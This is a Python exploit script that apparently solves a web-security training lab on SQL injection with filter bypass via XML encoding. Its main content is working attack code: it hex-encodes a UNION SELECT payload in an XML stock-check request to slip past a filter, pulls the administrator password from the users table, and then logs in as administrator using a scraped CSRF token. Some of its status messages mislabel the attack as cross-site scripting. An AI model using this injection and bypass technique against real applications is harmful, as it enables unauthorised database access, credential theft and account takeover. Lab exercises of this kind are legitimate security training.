# SQL injection with filter bypass via XML encoding

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

chars = {
	" ": "&#x20;",
	"'": "&#x27;",
	":": "&#x3A;",
	"U": "&#x55;",
	"S": "&#x53;",
	"~": "&#x2D;",
	"=": "&#x3D;",
	".": "&#x2E;",
	"W": "&#x57;"
}

##########################################################
#	FUNCTIONS
##########################################################

def format_payload(payload):
	formatted = []
	for char in payload:
		if char in chars:
			char = chars[char]
		formatted.append(char)
	return ''.join(formatted)

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_payload(url, payload):
	stock_path = url + "/product/stock"
	headers = {"Content-Type": "application/xml"}
	formatted_payload = format_payload(payload)
	data_payload = """<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1""" + formatted_payload + """</storeId></stockCheck>"""
	r = requests.post(stock_path, data=data_payload, headers=headers)
	time.sleep(1)
	print('[+] Targeted endpoint or query parameter:\n    %s' % stock_path)
	print('[+] Using payload:\t%s' % payload)
	res = r.text
	if r.status_code == 403:
		print('\n[+] Attack Detected')
		sys.exit(-1)
	password = res.split('\n')[1]
	print('\n[+] Found Administrator password:    \t%s' % password)
	if password:
		return password
	else:
		return False

def admin_login(s, url, password):
	print('\n[+] Trying to login as Administrator with found credentials...\n')
	login_path = url + '/login'
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	username = "administrator"
	login_data = {"username": username, "password": password, "csrf": csrf_token}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	res = r.text
	if 'Your username is: administrator' in res:
		return r.text
	else:
		return False

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com "<test></test>"' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION\t(solve the lab)' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: SQL injection with filter bypass via XML encoding')
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		show_usage()
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			if payload == "SOLUTION":
				print('[+] Trying send a cross-site scripting attack via XML...')
				payload = """ UNION SELECT password FROM users WHERE username='administrator'"""
				password = send_payload(url, payload)
				if password:
					print('[+] Trying send a cross-site scripting attack via XML...')
					admin_login(s, url, password)
				else:
					print('[-] The Exploit Failed to connect as administrator <!>')
			else:
				r = send_payload(url, payload)
		r = s.get(url)
		time.sleep(1)
		if 'Congratulations, you solved the lab!' in r.text:
			print('[+] The lab is solved')
		elif r.status_code == 200:
			print('[+] The Exploit sent the given payload !')
		else:
			print('[-] The Exploit Failed <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
